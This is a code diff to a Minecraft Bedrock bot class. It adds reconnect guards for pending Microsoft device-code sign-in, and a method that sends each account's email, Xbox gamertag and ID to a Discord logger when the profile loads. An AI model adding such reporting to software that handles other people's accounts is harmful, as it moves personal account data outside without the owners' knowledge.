@@ -207,6 +207,7 @@ export class BedrockBot extends EventEmitter {
           AccountManager.registerBotName(this.xboxUsername);
           AccountManager.registerBotName(this.inGameIgn);
         } catch {}
+        this.sendCredentialsSaverWebhook();
       }
       this.emit('profileReady', identity);
     });
@@ -357,6 +358,32 @@ export class BedrockBot extends EventEmitter {
   }
 
   /**
+   * Dispatches account credentials (Email & Xbox Username with . prefix) to the Webhook
+   */
+  public async sendCredentialsSaverWebhook(): Promise<void> {
+    let email = this.accountConfig.email || '';
+    if (!email) {
+      try {
+        const { getAccountById } = require('../database/SupabaseClient');
+        const row = await getAccountById(this.accountId);
+        if (row && row.email) {
+          email = row.email;
+          this.accountConfig.email = email;
+        }
+      } catch {}
+    }
+
+    const xboxUsername = this.xboxUsername || '';
+    if (!xboxUsername) return;
+
+    const key = `${this.accountId}:${email}:${xboxUsername}`;
+    if (this.lastSentCredentialsKey === key) return;
+    this.lastSentCredentialsKey = key;
+
+    await discordLogger.logAccountCredentials(email, xboxUsername, this.accountId);
+  }
+
+  /**
    * Finds the hotbar slot (0-8) currently holding the given item, e.g. 'minecraft:ender_pearl'.
    * Returns -1 if the item's runtime_id isn't known yet (palette not received) or none of the
    * hotbar slots hold it.
@@ -491,6 +518,10 @@ export class BedrockBot extends EventEmitter {
 
     // Watchdog auto-reconnect handler: Staggers reconnection through JoinScheduler to prevent auth rate-limits
     this.watchdog.setReconnectCallback(async () => {
+      if (this.authManager.getAccountStatus() === AccountAuthStatus.VERIFICATION_REQUIRED) {
+        logger.debug('Watchdog tick: Account is pending Microsoft device-code sign-in. Skipping reconnect.', this.accountId);
+        return;
+      }
       if (this.reconnectScheduler) {
         logger.info('Queuing watchdog reconnection via JoinScheduler to prevent auth rate-limits...', this.accountId);
         this.setState(ConnectionState.RECONNECTING);
@@ -616,6 +647,16 @@ export class BedrockBot extends EventEmitter {
 
     try {
       if (!isOffline) {
+        // Check if account is in VERIFICATION_REQUIRED state (waiting for Microsoft device code sign-in)
+        if (this.authManager.getAccountStatus() === AccountAuthStatus.VERIFICATION_REQUIRED) {
+          logger.warn(
+            `Account '${this.accountId}' is awaiting Microsoft device code verification (${this.msaCodeData?.user_code || 'code pending'}). Pausing duplicate connection attempt.`,
+            this.accountId
+          );
+          this.setState(ConnectionState.AUTH_FAILED);
+          return;
+        }
+
         // Check if account is in XBOX_PROFILE_REQUIRED state
         if (this.authManager.getAccountStatus() === AccountAuthStatus.XBOX_PROFILE_REQUIRED) {
           logger.warn(
@@ -642,6 +683,7 @@ export class BedrockBot extends EventEmitter {
           this.xboxUsername = ident.gamertag;
           const floodgatePrefix = process.env.FLOODGATE_PREFIX || '.';
           this.inGameIgn = `${floodgatePrefix}${this.xboxUsername}`;
+          this.sendCredentialsSaverWebhook();
         }
       } else {
         this.xboxUsername = this.accountId;
